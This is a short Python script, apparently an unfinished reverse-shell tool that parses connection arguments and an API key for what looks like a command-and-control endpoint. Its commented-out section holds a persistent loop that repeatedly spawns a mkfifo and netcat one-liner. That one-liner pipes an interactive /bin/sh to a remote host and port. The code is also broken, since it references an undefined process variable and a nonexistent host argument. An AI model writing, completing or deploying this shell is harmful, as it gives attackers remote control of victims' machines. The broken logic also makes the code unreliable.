#!/usr/bin/env python3
import argparse
import subprocess as sp
import time
import socket
import requests as rq

def main():
    parser = argparse.ArgumentParser(
        description="pls dont misuse this tool"
        )
    
    required_args = parser.add_argument_group("Required arguments")
    required_args.add_argument("api", help="API url/ip (eg. 127.0.0.1, 192.168.1.1)")
    required_args.add_argument("api_key", help="API key for authentication")

    hosting_args = parser.add_argument_group("Connecting arguments")
    hosting_args.add_argument("-t", "--target", help="Reverse shell target mode")
    hosting_args.add_argument("port", type=int, help="Port number to connect to")
    hosting_args.add_argument("delay", type=int, help="Delay in seconds between connection attempts")

    connecting_args = parser.add_argument_group("Connecting arguments")
    connecting_args.add_argument("-c", "--connect", help="Connect to the target")

    args = parser.parse_args()

    print(args)

    # if args.host:
    #     ip = args.host
    # else:
    #     ip = rq.get(f"http://{args.api}/api/reconnect?api_key={args.api_key}")

    # connect(ip, args.port, args.delay)

# def connect(ip, port, delay):
#     print(f"Connecting to {ip}:{port}")
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     s.settimeout(delay)
#     s.connect((ip, port))
#     while True:
#         time.sleep(delay)
#         try:
#             if process.poll() is not None:
#                 print("Process terminated, restarting...")
#                 process = sp.Popen(f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} >/tmp/f", shell=True)
#         except Exception:
#             print("Exiting...")
#             break

# if __name__ == "__main__":
#     main()
